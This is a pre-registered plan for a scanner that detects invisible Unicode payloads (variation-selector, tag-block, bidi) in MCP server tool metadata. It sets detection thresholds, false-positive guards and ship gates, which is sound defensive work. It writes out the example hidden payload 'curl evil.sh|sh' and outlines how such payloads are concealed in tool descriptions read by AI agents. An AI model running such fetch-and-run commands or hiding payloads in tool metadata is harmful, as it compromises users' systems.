# Trovark "Metadata Integrity" v1 — PRE-REGISTERED plan

> **This document fixes every threshold and ship gate BEFORE any corpus run.** Post-hoc threshold tuning against observed hits is how a "0% false-positive" claim becomes a lie. If the audit fails a gate, we change the plan *in a new commit with a stated reason* — we do not quietly move a number.

**Research basis:** `.superpowers/sdd/threat-spec.md` (spec) + `.superpowers/sdd/threat-refutation.md` (skeptic). Of ~58 statically-detectable threat classes surveyed, the skeptic REJECTED nearly all of them for a public index, on one principle:

> **Trovark may only ship checks where a false positive is impossible-by-construction, because the finding is a *fact*, not a *verdict*.**

Detecting "this description looks malicious" is a verdict → rejected. Detecting "these 15 codepoints at this byte offset decode to `curl evil.sh|sh`" is a fact → shippable.

## The differentiator (verified locally, not assumed)

```
U+FE00  \p{Cf}: false | \p{Cc}: false | \p{Mn}: true
U+FE0F  \p{Cf}: false | \p{Cc}: false | \p{Mn}: true
U+E0100 \p{Cf}: false | \p{Cc}: false | \p{Mn}: true
U+E01EF \p{Cf}: false | \p{Cc}: false | \p{Mn}: true
```
Variation selectors are category **Mn**. The industry-standard hidden-Unicode rule shape (Cf/Cc categories) **provably cannot match them**. And the encoding is real: a description rendering as `"Adds two numbers"` (16 visible chars) can carry 31 codepoints whose hidden 15 decode to `curl evil.sh|sh` — round-trip verified.

**Evidence class discipline (must appear verbatim wherever this is published):**
- The *encoding technique* is **[DOCUMENTED-REAL-WORLD]** — GlassWorm shipped variation-selector-encoded payloads to 35k+ installs, in the **OpenVSX/npm ecosystem, not MCP**.
- Its use *against MCP servers* is **[PROPOSED/LAB]** — no in-the-wild MCP instance is known.
- **Never conflate these two.** Every public claim states both.

## PRE-REGISTERED thresholds (fixed now)

| Constant | Value | Rationale |
|---|---|---|
| `MIN_VS_RUN` | **4** | Measured on 2,133 benign files / 27.5M chars: VS present anywhere = 0.94% of files; VS run ≥ 4 = **0.00%**. The run-length guard converts a ~1%-FPR rule into a 0%-FPR rule. |
| `MIN_DECODED` | **2** | A run must decode to ≥2 printable-ASCII chars; kills accidental runs. |
| printable set | `0x09, 0x0A, 0x20–0x7E` | Decoder output must look like text, not noise. |
| decoders | byte, then nibble-pair | byte: `VS1..16→0x00..0x0F`, `VS17..256→0x10..0xFF`. nibble-pair: even-length, all in VS1–VS16. |
| tag block | `U+E0000–U+E007F` | Separate detector; same run/decode discipline. |
| bidi overrides | `U+202A–202E, U+2066–2069` | Reported as an observation, not a payload. |

**Mandatory negative guards (must NOT fire):** emoji presentation selectors (`U+FE0F` after an emoji base), emoji ZWJ sequences, regional-indicator flag sequences, emoji **tag sequences** (the Wales/Scotland/England flags legitimately use `U+E0060–E007F`), Ideographic Variation Sequences (IVS) on CJK, and legitimate ZWNJ/ZWJ in Persian/Hindi/Bengali/Arabic. A blanket Cf/Cc rule fires on **TypeScript's own `lib.es2015.core.d.ts`** and `@types/node/process.d.ts` — that is precisely the false accusation we refuse to make.

## Integration — Phase 1 ships with PROVABLY ZERO grade effect

Findings are display-only (`score.ts` attaches them for rendering; the numeric score comes only from `SIGNALS[].evaluate(signals)` over typed `Signals` fields). Therefore:

- `RUBRIC_VERSION` **stays 1.4.0**. Add `Scorecard.checksVersion = '1.0.0'` (do not overload `rubricVersion` — it means "the version that graded it", and nothing here grades).
- New pure module `src/derive/integrity.ts`; called from `assemble.ts` beside `scanSecrets`; new "Metadata Integrity" report section; `IndexEntry.integrity` counts.
- **Absence ≠ clean:** if no files were fetched, `integrityHits` stays `undefined` and the report says *"not checked — no files fetched"*, NEVER "clean". A clean result prints its denominators: *"0 findings across N files / C characters / T tool descriptions."*
- **Scope honesty:** we fetch ≤24 files per repo and truncate at `SIZE_CAP=300_000`. Never say "we scan the repository." Say: *"we scan the tool metadata we extracted plus the ≤24 files we fetched, listed here."*

**Phase 2 (scoring) is gated on the audit passing** — it would add a `no-hidden-payload` security signal (weight 3, `undefined` when unchecked) and bump `RUBRIC_VERSION → 1.5.0` with a full 400-server zero-regression diff. Not now.

## Implementation traps (verified against real code)
1. `RepoFile.content` is a decoded JS string, not bytes — Cisco's raw-UTF-8 YARA rule is unusable here; use codepoint ranges.
2. Astral regexes need `/u`; prefer numeric `codePointAt` comparisons to regex entirely.
3. Astral chars have `ch.length === 2` — iterate with `for..of` and accumulate `ch.length`, or every column offset is wrong.
4. `SIZE_CAP` truncates content; a payload past 300 KB in one file is invisible. State it; don't claim completeness.
5. `README.md` is not fetched by the sampler.
6. `extractSchema` strips per-tool `evidence` before returning; D1 needs it. **Regression trap:** `schemaTokenEstimate = encode(JSON.stringify(tools…))` — if `evidence` leaks into that stringify, every cost score in the index shifts. Keep the strip there; add a test asserting `schemaTokenEstimate` is byte-identical before/after.

## SHIP GATES (all must hold before anything is published)
- **G1** Zero unexplained decode-confirmed hits at run ≥ 4 across the 400-server corpus.
- **G2** Every hit independently verifiable by a third party from published evidence alone (path + line + col + codepoints + decoded string).
- **G3** Near-miss audit: 100% of run ∈ {1,2,3} hits attributable to emoji / IVS / flag sequences. If any is not, the threshold is wrong and Step 0 restarts.
- **G4** Fixture suite green; all pre-existing tests green; `schemaTokenEstimate` byte-identical (trap 6).
- **G5** Full 400-server re-scan on true HEAD showing **zero grade changes** (guaranteed by construction in Phase 1 — assert it, don't assume it).

## Publish the result, including a zero
A zero is a legitimate, novel, honest, publishable finding — and it is simultaneously the false-positive measurement:

> *"Trovark scanned 400 public MCP servers — N tool definitions, M files, C characters — for invisible-payload encodings (variation-selector, tag-block, bidi). Result: K decode-confirmed payloads. Method, thresholds and machine-readable results published; every finding is a fact with an evidence link. We deliberately do not classify intent."*

## Positioning claim this earns (the only one we can win)
Canopii indexes 38× more servers; Snyk has a cloud LLM backend and 93.2% claimed precision. Trovark cannot win on coverage or on semantic cleverness. It can win on exactly one axis:

> **Every rule is published, deterministic, offline and reproducible; every finding is a fact with an evidence link; we deliberately do not classify intent.**

## Explicitly NOT building (skeptic's rejections, recorded so we don't relitigate)
Tool-poisoning *classification* from description text; homoglyph/confusable detection (fires on legitimate non-Latin names); token-passthrough detection (needs interprocedural taint analysis; absence of visible validation ≠ anti-pattern); command-injection SAST (fires on every server that legitimately shells out); rug-pull-as-security-finding (a description change is overwhelmingly a docs fix — publishing it as a security finding accuses every maintainer who fixes a typo); blanket Cf/Cc unicode flagging (fires on Microsoft's own TypeScript stdlib).
